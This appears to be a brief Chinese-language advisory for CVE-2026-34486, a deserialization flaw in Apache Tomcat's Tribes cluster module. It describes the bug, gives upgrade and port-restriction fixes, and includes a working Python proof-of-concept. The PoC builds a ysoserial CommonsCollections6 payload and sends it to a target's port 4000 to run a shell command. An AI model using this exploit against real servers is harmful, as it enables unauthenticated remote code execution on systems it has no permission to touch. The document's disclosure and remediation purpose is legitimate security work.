### 漏洞描述
CVE-2026-34486 是 Apache Tomcat Tribes 集群通信模块的 EncryptInterceptor 绕过漏洞。当解密失败时，漏洞代码仅记录错误但仍然转发原始未加密字节到反序列化流程，导致未认证 RCE。

### POC/利用
```python
import socket, struct

def exploit(target_ip, port=4000):
    import subprocess
    payload = subprocess.run(["java", "-jar", "ysoserial-all.jar", "CommonsCollections6", "touch /tmp/pwned"], capture_output=True).stdout
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, port))
    sock.send(struct.pack(">I", len(payload)) + payload)
    sock.close()
```

### 修复建议
1. 升级到 Tomcat 9.0.117 / 10.1.54 / 11.0.21
2. 限制端口 4000 访问
